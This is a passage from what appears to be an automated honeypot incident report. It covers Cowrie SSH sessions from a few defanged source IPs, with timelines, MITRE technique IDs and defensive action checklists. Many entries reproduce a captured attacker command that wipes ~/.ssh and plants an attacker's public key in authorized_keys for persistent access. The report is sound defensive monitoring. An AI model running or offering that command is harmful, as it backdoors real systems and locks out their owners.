| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:35:18` | `cowrie.session.connect` |
| `2026-04-13 06:35:18` | `cowrie.client.version` |
| `2026-04-13 06:35:18` | `cowrie.client.kex` |
| `2026-04-13 06:35:20` | `cowrie.login.success` |
| `2026-04-13 06:35:20` | `cowrie.session.params` |
| `2026-04-13 06:35:20` | `cowrie.command.input` |
| `2026-04-13 06:35:20` | `cowrie.command.failed` |
| `2026-04-13 06:35:21` | `cowrie.log.closed` |
| `2026-04-13 06:35:21` | `cowrie.session.params` |
| `2026-04-13 06:35:21` | `cowrie.command.input` |
| `2026-04-13 06:35:22` | `cowrie.session.file_download` |
| `2026-04-13 06:35:22` | `cowrie.log.closed` |
| `2026-04-13 06:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f15c2c9fe2

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:35 |
| **Last Seen** | 2026-04-13 06:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:35:25` | `cowrie.session.connect` |
| `2026-04-13 06:35:25` | `cowrie.client.version` |
| `2026-04-13 06:35:26` | `cowrie.client.kex` |
| `2026-04-13 06:35:27` | `cowrie.login.success` |
| `2026-04-13 06:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544359a9e45f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:35 |
| **Last Seen** | 2026-04-13 06:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:35:41` | `cowrie.session.connect` |
| `2026-04-13 06:35:41` | `cowrie.client.version` |
| `2026-04-13 06:35:41` | `cowrie.client.kex` |
| `2026-04-13 06:35:43` | `cowrie.login.success` |
| `2026-04-13 06:35:43` | `cowrie.session.params` |
| `2026-04-13 06:35:43` | `cowrie.command.input` |
| `2026-04-13 06:35:43` | `cowrie.command.failed` |
| `2026-04-13 06:35:43` | `cowrie.log.closed` |
| `2026-04-13 06:35:44` | `cowrie.session.params` |
| `2026-04-13 06:35:44` | `cowrie.command.input` |
| `2026-04-13 06:35:45` | `cowrie.session.file_download` |
| `2026-04-13 06:35:45` | `cowrie.log.closed` |
| `2026-04-13 06:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ca2b8f5924

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:35 |
| **Last Seen** | 2026-04-13 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:35:48` | `cowrie.session.connect` |
| `2026-04-13 06:35:48` | `cowrie.client.version` |
| `2026-04-13 06:35:48` | `cowrie.client.kex` |
| `2026-04-13 06:35:50` | `cowrie.login.success` |
| `2026-04-13 06:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a1817c8cf8a

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:37 |
| **Last Seen** | 2026-04-13 06:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:37:20` | `cowrie.session.connect` |
| `2026-04-13 06:37:20` | `cowrie.client.version` |
| `2026-04-13 06:37:20` | `cowrie.client.kex` |
| `2026-04-13 06:37:21` | `cowrie.login.success` |
| `2026-04-13 06:37:22` | `cowrie.session.params` |
| `2026-04-13 06:37:22` | `cowrie.command.input` |
| `2026-04-13 06:37:22` | `cowrie.command.failed` |
| `2026-04-13 06:37:23` | `cowrie.log.closed` |
| `2026-04-13 06:37:23` | `cowrie.session.params` |
| `2026-04-13 06:37:23` | `cowrie.command.input` |
| `2026-04-13 06:37:23` | `cowrie.session.file_download` |
| `2026-04-13 06:37:23` | `cowrie.log.closed` |
| `2026-04-13 06:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21cb2f005580

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:37 |
| **Last Seen** | 2026-04-13 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:37:27` | `cowrie.session.connect` |
| `2026-04-13 06:37:27` | `cowrie.client.version` |
| `2026-04-13 06:37:27` | `cowrie.client.kex` |
| `2026-04-13 06:37:29` | `cowrie.login.success` |
| `2026-04-13 06:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd17dc1814a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:37 |
| **Last Seen** | 2026-04-13 06:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:37:32` | `cowrie.session.connect` |
| `2026-04-13 06:37:32` | `cowrie.client.version` |
| `2026-04-13 06:37:33` | `cowrie.client.kex` |
| `2026-04-13 06:37:34` | `cowrie.login.success` |
| `2026-04-13 06:37:35` | `cowrie.session.params` |
| `2026-04-13 06:37:35` | `cowrie.command.input` |
| `2026-04-13 06:37:35` | `cowrie.command.failed` |
| `2026-04-13 06:37:35` | `cowrie.log.closed` |
| `2026-04-13 06:37:36` | `cowrie.session.params` |
| `2026-04-13 06:37:36` | `cowrie.command.input` |
| `2026-04-13 06:37:36` | `cowrie.session.file_download` |
| `2026-04-13 06:37:36` | `cowrie.log.closed` |
| `2026-04-13 06:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce08e7572084

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:37 |
| **Last Seen** | 2026-04-13 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:37:40` | `cowrie.session.connect` |
| `2026-04-13 06:37:40` | `cowrie.client.version` |
| `2026-04-13 06:37:40` | `cowrie.client.kex` |
| `2026-04-13 06:37:41` | `cowrie.login.success` |
| `2026-04-13 06:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeac074e72ed

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:38 |
| **Last Seen** | 2026-04-13 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:38:28` | `cowrie.session.connect` |
| `2026-04-13 06:38:28` | `cowrie.client.version` |
| `2026-04-13 06:38:28` | `cowrie.client.kex` |
| `2026-04-13 06:38:28` | `cowrie.login.success` |
| `2026-04-13 06:38:28` | `cowrie.session.params` |
| `2026-04-13 06:38:28` | `cowrie.command.input` |
| `2026-04-13 06:38:28` | `cowrie.command.failed` |
| `2026-04-13 06:38:28` | `cowrie.log.closed` |
| `2026-04-13 06:38:28` | `cowrie.session.params` |
| `2026-04-13 06:38:28` | `cowrie.command.input` |
| `2026-04-13 06:38:28` | `cowrie.session.file_download` |
| `2026-04-13 06:38:28` | `cowrie.log.closed` |
| `2026-04-13 06:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5ebfa26b1ac

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:38 |
| **Last Seen** | 2026-04-13 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:38:30` | `cowrie.session.connect` |
| `2026-04-13 06:38:30` | `cowrie.client.version` |
| `2026-04-13 06:38:30` | `cowrie.client.kex` |
| `2026-04-13 06:38:30` | `cowrie.login.success` |
| `2026-04-13 06:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad65db4bca94

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:38 |
| **Last Seen** | 2026-04-13 06:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:38:45` | `cowrie.session.connect` |
| `2026-04-13 06:38:45` | `cowrie.client.version` |
| `2026-04-13 06:38:45` | `cowrie.client.kex` |
| `2026-04-13 06:38:46` | `cowrie.login.success` |
| `2026-04-13 06:38:46` | `cowrie.session.params` |
| `2026-04-13 06:38:46` | `cowrie.command.input` |
| `2026-04-13 06:38:46` | `cowrie.command.failed` |
| `2026-04-13 06:38:46` | `cowrie.log.closed` |
| `2026-04-13 06:38:47` | `cowrie.session.params` |
| `2026-04-13 06:38:47` | `cowrie.command.input` |
| `2026-04-13 06:38:47` | `cowrie.session.file_download` |
| `2026-04-13 06:38:47` | `cowrie.log.closed` |
| `2026-04-13 06:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c59cd3e81b51

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:38 |
| **Last Seen** | 2026-04-13 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:38:49` | `cowrie.session.connect` |
| `2026-04-13 06:38:49` | `cowrie.client.version` |
| `2026-04-13 06:38:49` | `cowrie.client.kex` |
| `2026-04-13 06:38:50` | `cowrie.login.success` |
| `2026-04-13 06:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c493e438a3c6

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:39 |
| **Last Seen** | 2026-04-13 06:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:39:15` | `cowrie.session.connect` |
| `2026-04-13 06:39:15` | `cowrie.client.version` |
| `2026-04-13 06:39:16` | `cowrie.client.kex` |
| `2026-04-13 06:39:17` | `cowrie.login.success` |
| `2026-04-13 06:39:17` | `cowrie.session.params` |
| `2026-04-13 06:39:17` | `cowrie.command.input` |
| `2026-04-13 06:39:17` | `cowrie.command.failed` |
| `2026-04-13 06:39:18` | `cowrie.log.closed` |
| `2026-04-13 06:39:18` | `cowrie.session.params` |
| `2026-04-13 06:39:18` | `cowrie.command.input` |
| `2026-04-13 06:39:19` | `cowrie.session.file_download` |
| `2026-04-13 06:39:19` | `cowrie.log.closed` |
| `2026-04-13 06:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164772c96c2f

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:39 |
| **Last Seen** | 2026-04-13 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:39:22` | `cowrie.session.connect` |
| `2026-04-13 06:39:22` | `cowrie.client.version` |
| `2026-04-13 06:39:23` | `cowrie.client.kex` |
| `2026-04-13 06:39:24` | `cowrie.login.success` |
| `2026-04-13 06:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1657be95ff21

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:39 |
| **Last Seen** | 2026-04-13 06:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:39:26` | `cowrie.session.connect` |
| `2026-04-13 06:39:26` | `cowrie.client.version` |
| `2026-04-13 06:39:26` | `cowrie.client.kex` |
| `2026-04-13 06:39:27` | `cowrie.login.success` |
| `2026-04-13 06:39:28` | `cowrie.session.params` |
| `2026-04-13 06:39:28` | `cowrie.command.input` |
| `2026-04-13 06:39:28` | `cowrie.command.failed` |
| `2026-04-13 06:39:28` | `cowrie.log.closed` |
| `2026-04-13 06:39:29` | `cowrie.session.params` |
| `2026-04-13 06:39:29` | `cowrie.command.input` |
| `2026-04-13 06:39:29` | `cowrie.session.file_download` |
| `2026-04-13 06:39:29` | `cowrie.log.closed` |
| `2026-04-13 06:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-002078fe407d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:39 |
| **Last Seen** | 2026-04-13 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:39:33` | `cowrie.session.connect` |
| `2026-04-13 06:39:33` | `cowrie.client.version` |
| `2026-04-13 06:39:33` | `cowrie.client.kex` |
| `2026-04-13 06:39:34` | `cowrie.login.success` |
| `2026-04-13 06:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cfad2d8d5c9

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:40 |
| **Last Seen** | 2026-04-13 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:40:29` | `cowrie.session.connect` |
| `2026-04-13 06:40:29` | `cowrie.client.version` |
| `2026-04-13 06:40:29` | `cowrie.client.kex` |
| `2026-04-13 06:40:30` | `cowrie.login.success` |
| `2026-04-13 06:40:30` | `cowrie.session.params` |
| `2026-04-13 06:40:30` | `cowrie.command.input` |
